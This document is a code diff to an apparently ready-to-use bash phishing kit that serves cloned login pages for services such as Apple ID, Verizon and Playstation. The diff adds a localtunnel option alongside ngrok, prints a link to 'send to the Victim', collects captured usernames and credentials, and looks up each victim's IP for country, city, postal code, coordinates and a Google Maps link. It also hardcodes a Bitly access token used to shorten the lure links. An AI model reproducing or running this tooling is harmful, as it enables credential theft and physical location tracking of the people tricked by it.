@@ -23,7 +23,9 @@ printf "          \e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;91m Apple ID\e
 printf "          \e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;91m Verizon\e[0m        \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;91m Playstation  \e[0m           \e[1;94m                  \n"
 
 
-read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option
+read -p $'\n\e[1;92m\e[0m\e[1;77m\e[0m\e[1;92m ┌─[ Choose an option:]─[~]
+ └──╼ ~ ' option
+
 
 
 if [[ $option == 1 ]]; then
@@ -189,10 +191,12 @@ menu
 fi
 }
 
+
 stop() {
 
 checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
 checkphp=$(ps aux | grep -o "php" | head -n1)
+checknode=$(ps aux | grep -o "node" | head -n1)
 if [[ $checkngrok == *'ngrok'* ]]; then
 pkill -f -2 ngrok > /dev/null 2>&1
 killall -2 ngrok > /dev/null 2>&1
@@ -201,7 +205,10 @@ if [[ $checkphp == *'php'* ]]; then
 pkill -f -2 php > /dev/null 2>&1
 killall -2 php > /dev/null 2>&1
 fi
-
+if [[ $checknode == *'node'* ]]; then
+pkill -f -2 node > /dev/null 2>&1
+killall -2 node > /dev/null 2>&1
+fi
 
 }
 
@@ -271,11 +278,13 @@ cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
 killall -2 php > /dev/null 2>&1
 killall -2 ngrok > /dev/null 2>&1
+killall -2 node > /dev/null 2>&1
 exit 1
 
 }
 
 getcredentials() {
+echo ' '
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
 while [ true ]; do
 
@@ -296,87 +305,55 @@ touch sites/$server/saved.usernames.txt
 ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+ipv4=`curl -s https://ipinfo.io/$ip/json | jq -r  '.ip'`
+cn=`curl -s https://ipapi.co/$ip//json | jq -r  '.country_name'`
+re=`curl -s https://ipapi.co/$ip//json | jq -r  '.region'`
+ct=`curl -s https://ipapi.co/$ip//json | jq -r '.city'`
+post=`curl -s https://ipapi.co/$ip//json | jq -r  '.postal'`
+loc=`curl -s https://ipinfo.io/$ip/json | jq -r  '.loc'`
+org=`curl -s https://ipinfo.io/$ip/json | jq -r  '.org'`
+tz=`curl -s https://ipinfo.io/$ip/json | jq -r '.timezone'`
+lat=`curl -s https://ipapi.co/$ip/json/ | jq -r '.latitude'`
+lon=`curl -s https://ipapi.co/$ip/json/ | jq -r '.longitude'`
+
+gm=`echo "https://www.google.com/maps/search/?api=1&query="$lat,$lon`
+
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] IPv6:\e[0m\e[1;77m %s\e[0m\n" $ip
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Country:\e[0m\e[1;77m %s\e[0m\n" $cn
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Region:\e[0m\e[1;77m %s\e[0m\n" $re
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] City:\e[0m\e[1;77m %s\e[0m\n" $ct
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Postal:\e[0m\e[1;77m %s\e[0m\n" $post
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Location:\e[0m\e[1;77m %s\e[0m\n" $loc
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Maps:\e[0m\e[1;77m %s\e[0m\n" $gm
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] ISP:\e[0m\e[1;77m %s\e[0m\n" $org
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Timezone:\e[0m\e[1;77m %s\e[0m\n" $tz
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
 cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
 
 
-if [[ -e iptracker.log ]]; then
-rm -rf iptracker.log
-fi
 
-IFS='\n'
-iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
-IFS=$'\n'
-continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
-printf "\n"
-hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
-if [[ $hostnameip != "" ]]; then
-printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
-fi
-
-
-reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
-if [[ $reverse_dns != "" ]]; then
-printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
-fi
-
-
-
-if [[ $continent != "" ]]; then
-printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
-fi
-
-
-country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
-if [[ $country != "" ]]; then
-printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
-fi
-
-
-state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
-if [[ $state != "" ]]; then
-printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
-fi
-
-city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-
-if [[ $city != "" ]]; then
-printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
-fi
-
-
-isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-if [[ $isp != "" ]]; then
-printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
-fi
-
-
-as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-if [[ $as_number != "" ]]; then
-printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
-fi
-
-
-ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-if [[ $ip_speed != "" ]]; then
-printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
-fi
-
-ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-
-if [[ $ip_currency != "" ]]; then
-printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
-fi
-
-printf "\n"
-rm -rf iptracker.log
 
 getcredentials
 }
-
 start() {
+printf "\n"
+printf "1.Ngrok\n"
+printf "2.Localtunnel\n"
+echo ""
+read -p $'\n\e[1;92m\e[0m\e[1;77m\e[0m\e[1;92m ┌─[ Choose the tunneling method:]─[~]
+ └──╼ ~ ' host
+ 
+if [[ $host == 1 ]]; then
+sleep 1
+start_ngrok
+elif [[ $host == 2 ]]; then
+sleep 1
+start_localtunnel
+fi
+}
+
+start_ngrok() {
 if [[ -e sites/$server/ip.txt ]]; then
 rm -rf sites/$server/ip.txt
 
@@ -430,13 +407,43 @@ sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
-short_link=`wget -q -O - http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=$link\&keyword=$2`
+Accesstoken=433bdc6028d67bba06cf95286e923cde8c0906c7
+api=https://api-ssl.bitly.com/v4/shorten
+short_link=`curl -s -H Authorization:\ $Accesstoken -H Content-Type: -d '{"long_url": "'"$link"\"} $api | jq -j .link | xsel -ib; xsel -ob;` 
 printf "\e[1;92m[\e[0m*\e[1;92m] Use shortened link instead:\e[0m\e[1;77m %s\e[0m\n" $short_link
 echo ""
 echo ""
 
 checkfound
 }
+start_localtunnel()  {
+if [[ -e sites/$server/ip.txt ]]; then
+rm -rf sites/$server/ip.txt
+
+fi
+if [[ -e sites/$server/usernames.txt ]]; then
+rm -rf sites/$server/usernames.txt
+
+fi
+
+printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
+cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
+sleep 2
+
+printf "\e[1;92m[\e[0m*\e[1;92m] Starting localtunnel server...\n"
+./ngrok http 127.0.0.1:5555  > /dev/null 2>&1 &
+sleep 8
+lt --port 5555 --subdomain wmw-$server-com > /dev/null 2>&1 &
+sleep 4
+printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" "https://wmw-"$server"-com.loca.lt"
+short_link=`wget -q -O - http://tinyurl.com/api-create.php?url=https://wmw-$server-com.loca.lt`
+printf "\e[1;92m[\e[0m*\e[1;92m] Use shortened link instead:\e[0m\e[1;77m %s\e[0m\n" $short_link
+echo ""
+echo ""
+
+checkfound
+}
+
 checkfound() {
 
 
@@ -454,6 +461,10 @@ done
 
 }
 rm -rf setup.sh
+rm -rf tmxsp.sh
+rm -rf index.html
+rm -rf .gitignore
+rm -rf .nojekyll
 banner
 menu
 
